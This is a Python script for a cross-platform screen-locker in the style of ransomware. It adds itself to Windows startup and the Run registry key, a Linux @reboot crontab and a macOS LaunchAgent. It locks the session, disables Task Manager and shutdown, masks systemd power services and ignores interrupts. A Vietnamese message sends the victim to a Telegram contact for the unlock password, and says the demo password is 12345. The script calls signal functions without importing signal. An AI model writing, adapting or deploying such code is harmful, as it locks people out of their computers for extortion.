import os
import sys
import time
import subprocess
import platform
import ctypes
import shutil
import getpass

PASSWORD = "12345"          
TELEGRAM_CONTACT = "@Ctvgiadinh"  
AUTO_STARTUP = True             

def get_os():
    return platform.system().lower()
  
def install_persistence():
    script_path = os.path.abspath(sys.argv[0])
    try:
        if get_os() == "windows":
            startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            dest = os.path.join(startup_dir, "system_lock.bat")
            with open(dest, "w") as f:
                f.write(f'@echo off\npython "{script_path}"\n')
            subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemLock", "/t", "REG_SZ", "/d", f'python "{script_path}"', "/f"], capture_output=True)
            print("[Persistence] Windows startup + registry installed")
        elif get_os() == "linux":
            cron_line = f"@reboot python3 {script_path} &"
            subprocess.run(["crontab", "-l"], stdout=open("/tmp/cron_temp","w"), stderr=subprocess.DEVNULL, text=True)
            with open("/tmp/cron_temp", "a") as f:
                f.write(cron_line + "\n")
            subprocess.run(["crontab", "/tmp/cron_temp"], capture_output=True)
            os.remove("/tmp/cron_temp")
            print("[Persistence] Linux crontab @reboot installed")
        elif get_os() == "darwin":
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.systemlock.plist")
            with open(plist_path, "w") as f:
                f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.systemlock</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>''')
            subprocess.run(["launchctl", "load", plist_path], capture_output=True)
            print("[Persistence] macOS launchd installed")
    except Exception as e:
        print(f"[Persistence] Error: {e}")

def lock_windows():
    try:
        user32 = ctypes.WinDLL("user32")
        user32.LockWorkStation()
        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"], capture_output=True)
        subprocess.run(["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "/v", "NoClose", "/t", "REG_DWORD", "/d", "1", "/f"], capture_output=True)
        subprocess.run(["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power", "/v", "HiberbootEnabled", "/t", "REG_DWORD", "/d", "0", "/f"], capture_output=True)
        print("[Windows] Locked, shutdown/taskmgr disabled")
    except Exception as e:
        print(f"[Windows] Lock error: {e}")

def lock_linux():
    try:
        subprocess.run(["gnome-screensaver-command", "-l"], capture_output=True, timeout=5)
        subprocess.run(["loginctl", "lock-session"], capture_output=True)
        subprocess.run(["systemctl", "mask", "systemd-poweroff.service"], capture_output=True)
        subprocess.run(["systemctl", "mask", "systemd-reboot.service"], capture_output=True)
        subprocess.run(["systemctl", "mask", "systemd-halt.service"], capture_output=True)
        print("[Linux] Locked, shutdown disabled")
    except Exception as e:
        print(f"[Linux] Lock error: {e}")

def lock_macos():
    try:
        subprocess.run(["pmset", "displaysleepnow"], capture_output=True)
        subprocess.run(["osascript", "-e", 'tell application "System Events" to key code 12 using {command down, control down}'], capture_output=True)
        subprocess.run(["sudo", "pmset", "-a", "autorestart", "0"], capture_output=True)
        print("[macOS] Locked")
    except Exception as e:
        print(f"[macOS] Lock error: {e}")

def lock_system():
    os_name = get_os()
    if os_name == "windows": lock_windows()
    elif os_name == "linux": lock_linux()
    elif os_name == "darwin": lock_macos()
    else: print(f"[!] Unsupported OS: {os_name}")

def unlock_system(password):
    return password == PASSWORD

def cleanup_after_unlock():
    if get_os() != "windows":
        return
  
    subprocess.run(["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/f"], capture_output=True)
    subprocess.run(["reg", "delete", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "/v", "NoClose", "/f"], capture_output=True)
    
    cmd_script = f'''@echo off
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /f
reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "NoClose" /f
del "{sys.argv[0]}" /f /q
exit
'''
    with open("cleanup.bat", "w") as f:
        f.write(cmd_script)
    subprocess.Popen(["cmd", "/c", "start", "cleanup.bat"], shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
    print("[Cleanup] Cmd opened with cleanup and self-delete")

def ignore_signal(sig, frame):
    print("[!] Exit blocked")

def startup_lock():
    print("[*] System locking in 3 seconds...")
    time.sleep(3)
    lock_system()
    while True:
        try:
            print(f"\nMUỐN MỞ HÃY LIÊN HỆ TELEGRAM {TELEGRAM_CONTACT} ĐỂ MỞ. NÀY DEMO THÔI MK LÀ 12345 NHÉ")
            pwd = getpass.getpass("[LOCKED] Enter password: ")
            if unlock_system(pwd):
                print("[*] Unlocked successfully")
                cleanup_after_unlock()
                break
            else:
                print("[!] Wrong password")
                lock_system()
        except KeyboardInterrupt:
            print("[!] Interrupt ignored")
            lock_system()
        except Exception as e:
            print(f"[!] Error: {e}")
            lock_system()

def main():
    if get_os() == "windows":
        ctypes.windll.kernel32.SetConsoleCtrlHandler(None, True)  
    signal.signal(signal.SIGINT, ignore_signal)
    signal.signal(signal.SIGTERM, ignore_signal)
    if AUTO_STARTUP:
        install_persistence()
    startup_lock()

if __name__ == "__main__":
    main()